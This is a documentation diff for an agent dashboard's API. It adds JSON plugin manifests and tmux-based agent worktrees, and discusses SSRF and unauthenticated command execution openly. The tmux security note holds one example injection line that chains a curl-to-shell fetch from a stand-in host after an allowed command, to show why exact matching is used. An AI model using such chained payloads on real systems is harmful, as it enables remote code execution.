@@ -994,8 +994,304 @@ Valid `event` values: `ci_pass`, `ci_fail`, `deploy`, `deploy_fail`, `alert`, `r
 | GET | `/api/workspace/git/status` | Workspace git status |
 | POST | `/api/workspace/git/commit` | Commit workspace changes |
 | POST | `/api/workspace/git/push` | Push workspace branch |
+| GET | `/api/plugins` | List loaded plugin manifests |
+| GET | `/api/plugins/tools` | Flat namespaced plugin tool list |
+| GET | `/api/plugins/:name` | Single plugin manifest |
+| POST | `/api/plugins/reload` | Re-scan the plugins directory |
+| POST | `/api/plugins/:name/tools/:tool/invoke` | Call a plugin tool |
+| POST | `/api/plugins/:name/events` | Emit a declared plugin event |
+| GET | `/api/worktrees` | List agent tmux worktrees |
+| POST | `/api/worktrees` | Launch an agent in a tmux worktree |
+| DELETE | `/api/worktrees/:slug` | Kill window + remove worktree |
 
 ---
+
+---
+
+## Plugins
+
+A plugin extends the dashboard with tools and events **without modifying core
+server code**. Plugins are declarative JSON manifests placed in
+`dashboard/config/plugins/*.plugin.json` — the same "drop a file in a config
+directory" pattern as `config/mcp-registry.json`.
+
+Manifests are pure data. Nothing in a manifest is executed at load time, so a
+malformed or hostile file can only ever be rejected, never run. Invalid
+manifests are logged and skipped; they never prevent the dashboard from booting.
+
+Override the directory with `AGENT_BOARD_PLUGINS_DIR`.
+
+> **Security — treat the plugins directory as trusted input.**
+> "Not executed" is not the same as "harmless". A manifest names an http(s) host
+> that the dashboard will then call on request, so anyone who can write to
+> `dashboard/config/plugins/` can make the dashboard issue arbitrary HTTP
+> requests from its own network position — including to hosts reachable only
+> from inside the Docker network (SSRF). There is no plugin sandbox, no
+> egress allow-list, and no per-plugin authentication.
+>
+> Mitigations in place: only `http(s)` URLs are accepted, redirects are not
+> followed (`maxRedirects: 0`), request arguments are capped at 256 KB, response
+> bodies at 8 MB, and every tool has a bounded timeout (default 15s, max 120s).
+>
+> Give the plugins directory the same level of trust as the compose files. Do
+> not point it at a location writable by untrusted users, and do not load
+> third-party manifests you have not read.
+
+### Manifest shape (v1)
+
+```json
+{
+  "manifestVersion": 1,
+  "name": "example-echo",
+  "version": "1.0.0",
+  "description": "What this plugin does",
+  "enabled": true,
+  "baseUrl": "${EXAMPLE_ECHO_URL:-http://tool-content-gen:3200}",
+  "tools": [
+    {
+      "name": "echo",
+      "description": "Echo a message back",
+      "transport": "http",
+      "method": "POST",
+      "path": "/echo",
+      "timeoutMs": 10000,
+      "parameters": {
+        "type": "object",
+        "properties": { "message": { "type": "string" } },
+        "required": ["message"]
+      }
+    }
+  ],
+  "events": {
+    "channel": "plugins",
+    "emits": ["example-echo.invoked", "example-echo.failed"]
+  }
+}
+```
+
+| Field | Required | Notes |
+|-------|----------|-------|
+| `manifestVersion` | no | Defaults to `1`; other values are rejected |
+| `name` | **yes** | `[a-z0-9][a-z0-9_-]{0,63}`, unique across all plugins |
+| `version` | **yes** | semver, e.g. `1.0.0` |
+| `enabled` | no | Defaults to `true` |
+| `baseUrl` | no* | Default host for tools; must be `http(s)` |
+| `tools[].name` | **yes** | `[a-zA-Z0-9_-]{1,64}`, unique within the plugin |
+| `tools[].transport` | no | Only `http` today; anything else is rejected |
+| `tools[].method` | no | `GET`/`POST`/`PUT`/`PATCH`/`DELETE`, defaults `POST` |
+| `tools[].url` | no* | Per-tool host override |
+| `tools[].path` | no | Appended to `url ?? baseUrl`; must start with `/` |
+| `tools[].timeoutMs` | no | Defaults 15s, clamped to 1s–120s |
+| `tools[].parameters` | no | Free-form JSON schema, surfaced to agents |
+| `events.channel` | no | Event-bus channel, defaults `plugins` |
+| `events.emits` | no | Allow-list of event types the plugin may emit |
+
+\* A tool needs a host from either `tools[].url` or the plugin-level `baseUrl`;
+a tool with neither is rejected.
+
+`${VAR}` and `${VAR:-default}` are expanded from the environment at load time,
+matching the MCP registry's behavior.
+
+### Registration
+
+Plugins are registered by **file placement**, not by code:
+
+1. Drop `<name>.plugin.json` into `dashboard/config/plugins/`.
+2. Restart the dashboard, or `POST /api/plugins/reload` to re-scan without one.
+3. `GET /api/plugins` shows what loaded and, in `errors`, what was rejected and why.
+
+`dashboard/config/plugins/example-echo.plugin.json` ships as a working reference.
+
+### Invoking a tool
+
+```bash
+curl -X POST http://localhost:3000/api/plugins/example-echo/tools/echo/invoke \
+  -H 'Content-Type: application/json' \
+  -d '{"arguments": {"message": "hello"}}'
+```
+
+Arguments go in `arguments` (a bare body is also accepted) and are capped at
+256 KB. `GET`/`DELETE` tools receive them as query params, others as a JSON body.
+An unreachable backend returns `503` with the reason; a non-2xx backend response
+returns `502`. Both include `durationMs`.
+
+### Emitting events
+
+```bash
+curl -X POST http://localhost:3000/api/plugins/example-echo/events \
+  -H 'Content-Type: application/json' \
+  -d '{"event_type": "example-echo.invoked", "metadata": {"via": "curl"}}'
+```
+
+A plugin may only emit event types it declared in `events.emits` — it cannot
+spoof arbitrary dashboard events. Accepted events are published to the plugin's
+event-bus channel, so they flow to `/api/channels/:name/history` and to
+WebSocket subscribers like any other dashboard event.
+
+---
+
+## tmux Multi-Agent Worktrees
+
+Spawns parallel agent instances, each isolated in its own tmux window with its
+own git worktree, so several agents can work on the same repo without colliding.
+
+**Disabled by default.** Set `AGENT_BOARD_ENABLE_TMUX=true` to allow the
+dashboard to spawn processes — the same opt-in shape as
+`AGENT_BOARD_ENABLE_DOCKER_CONTROL`. While disabled, `GET` reports
+`enabled: false` and the mutating routes return `503` naming the env var.
+
+> **Security — this endpoint runs commands, and the dashboard has no auth.**
+>
+> **The route is unauthenticated. That is unmitigated by design in this feature**
+> — the dashboard ships with no authentication or authorization on *any* route
+> (there is no auth middleware in `server.js`), and this endpoint inherits that
+> posture. A reverse proxy can control *who* reaches the port, but it cannot
+> constrain what an authorized caller may then execute, so it does not close
+> this gap. Per-route auth is genuine repo-wide work and is not solved here.
+>
+> Because the route cannot authenticate callers, **what it is willing to execute
+> is gated instead**, via two independent switches:
+>
+> | Env var | Default | Grants |
+> |---------|---------|--------|
+> | `AGENT_BOARD_ENABLE_TMUX` | off | create worktrees and **empty** tmux windows |
+> | `AGENT_BOARD_TMUX_ALLOWED_COMMANDS` | empty | run the listed commands |
+>
+> With the allowlist empty — the default, even when the feature is fully enabled
+> — any request carrying a `command` is refused with `403` and this route cannot
+> execute anything at all. Enabling the feature alone does **not** grant remote
+> command execution; an operator must additionally name each permitted command.
+>
+> Matching is **exact**, never prefix-based: allowing `npm test` does not admit
+> `npm test; curl evil.sh | sh`, because tmux runs the string in a shell and a
+> prefix rule would be trivially bypassable.
+>
+> Also bounded: worktree names are slugified to `[a-z0-9][a-z0-9-]{0,39}` and
+> rejected otherwise, branch names are pattern-checked, commands are capped at
+> 2000 chars, and every argument is passed via `execFile` as a single argv
+> element — so callers cannot inject extra commands through the slug or branch.
+>
+> Residual risk, stated plainly: with `AGENT_BOARD_ENABLE_TMUX=true`, any client
+> that can reach the port can create and delete worktrees and tmux windows, and
+> can run any command the operator has allowlisted. Only enable it on a host you
+> control, bound to a trusted interface, and keep the allowlist minimal.
+
+### Session naming scheme
+
+| Element | Pattern | Example |
+|---------|---------|---------|
+| tmux session | `agentboard` | `agentboard` |
+| tmux window | `ab-<slug>` | `ab-refactor-auth` |
+| tmux target | `<session>:ab-<slug>` | `agentboard:ab-refactor-auth` |
+| git branch | `agent/<slug>` | `agent/refactor-auth` |
+| worktree path | `<worktree-root>/<slug>` | `/workspace/.worktrees/refactor-auth` |
+
+`<slug>` is derived from the requested name: lowercased, non-alphanumerics
+collapsed to `-`, trimmed, capped at 40 chars, and required to match
+`[a-z0-9][a-z0-9-]{0,39}`. A name that cannot reduce to a valid slug is
+rejected with `400` before any command runs — this is also what keeps shell
+metacharacters out of the tmux and git argv.
+
+One flat session with one window per agent means `tmux attach -t agentboard`
+then `Ctrl-b w` gives a human the full picture of every running agent, and
+`tmux kill-window -t agentboard:ab-<slug>` cleanly stops just one.
+
+**Configuration:**
+
+| Env var | Default | Purpose |
+|---------|---------|---------|
+| `AGENT_BOARD_ENABLE_TMUX` | `false` | Master opt-in switch |
+| `AGENT_BOARD_TMUX_SESSION` | `agentboard` | Session name |
+| `AGENT_BOARD_WORKTREE_ROOT` | `$WORKSPACE_ROOT/.worktrees` | Where worktrees are checked out |
+| `AGENT_BOARD_TMUX_ALLOWED_COMMANDS` | *(empty)* | Comma-separated, exact-match allowlist of commands `POST` may run. Empty means no command may be executed. |
+| `AGENT_BOARD_TMUX_EXEC_TIMEOUT_MS` | `30000` | Timeout for each `tmux`/`git` invocation. Clamped to 1s–10m; invalid values fall back to the default. |
+
+### Launch an agent
+
+```bash
+curl -X POST http://localhost:3000/api/worktrees \
+  -H 'Content-Type: application/json' \
+  -d '{"name": "Refactor Auth"}'
+```
+
+```json
+{
+  "success": true,
+  "worktree": {
+    "slug": "refactor-auth",
+    "session": "agentboard",
+    "window": "ab-refactor-auth",
+    "target": "agentboard:ab-refactor-auth",
+    "branch": "agent/refactor-auth",
+    "path": "/workspace/.worktrees/refactor-auth",
+    "worktreeCreated": true,
+    "commandSent": false,
+    "attachCommand": "tmux attach -t agentboard \\; select-window -t ab-refactor-auth"
+  }
+}
+```
+
+`command` is optional and, under the default empty
+`AGENT_BOARD_TMUX_ALLOWED_COMMANDS` shown above, any value refuses the request
+with `403` before anything is created — so the example omits it. To also send a
+command, first configure the allowlist:
+
+```bash
+AGENT_BOARD_TMUX_ALLOWED_COMMANDS="npm test" npm start
+curl -X POST http://localhost:3000/api/worktrees \
+  -H 'Content-Type: application/json' \
+  -d '{"name": "Refactor Auth", "command": "npm test"}'
+# → "commandSent": true, sent to the new window with `tmux send-keys`
+```
+
+A slug that already has a window returns `409` rather than launching a second
+agent into it. Emits `worktree_created` on the event bus.
+
+**Isolation is enforced, never degraded.** A launch either gets its own checkout
+or fails — it will not fall back to the shared worktree root, because that would
+put concurrent agents in one working tree:
+
+| Failure | Result |
+|---------|--------|
+| `WORKSPACE_ROOT` unset | `503`, nothing created |
+| `git worktree add` fails | `503`, no tmux window created |
+| `tmux new-window` fails | `503`, worktree rolled back — `rolledBack: true` only if the removal itself also succeeded; otherwise `rolledBack: false` with a `warning` naming the checkout path |
+| `tmux send-keys` fails | `503`, window killed **and** worktree rolled back — same `rolledBack`/`warning` contract: rollback requires both the window to be gone **and** the worktree removal to succeed |
+
+Rollback is attempted in every case above, but is not guaranteed to succeed
+(e.g. a locked working tree can make `git worktree remove` itself fail) — check
+`rolledBack` and `warning` in the response rather than assuming success from the
+`503` alone.
+
+### List and tear down
+
+```bash
+curl http://localhost:3000/api/worktrees
+curl -X DELETE http://localhost:3000/api/worktrees/refactor-auth
+curl -X DELETE 'http://localhost:3000/api/worktrees/refactor-auth?keepWorktree=true'
+```
+
+`DELETE` kills the tmux window and removes the git worktree; pass
+`?keepWorktree=true` to keep the checkout for inspection. Emits
+`worktree_removed`. The dashboard UI exposes all of this through the **Agents**
+dropdown in the top bar.
+
+**Teardown will not destroy live work.** `git worktree remove --force` discards
+uncommitted changes, so it only runs once the window is confirmed gone:
+
+| `tmux kill-window` result | Result |
+|---------------------------|--------|
+| succeeded | worktree removed, `200 success: true` |
+| window/session did not exist | treated as orphan cleanup — worktree removed, `200` |
+| failed for any other reason (busy, locked, permissions) | **`409`, worktree left untouched** — an agent may still be working in it |
+| tmux not installed | `503` |
+| removal itself failed | `500 success: false`, reporting that the checkout is still on disk |
+
+The endpoint never reports `success: true` while the window survived or the
+checkout is still present — except with `?keepWorktree=true`, where retaining
+the checkout is the intended outcome: that request reports `200 success: true`
+once the window is gone, with the checkout deliberately left behind for
+inspection rather than removed.
 
 ---
 
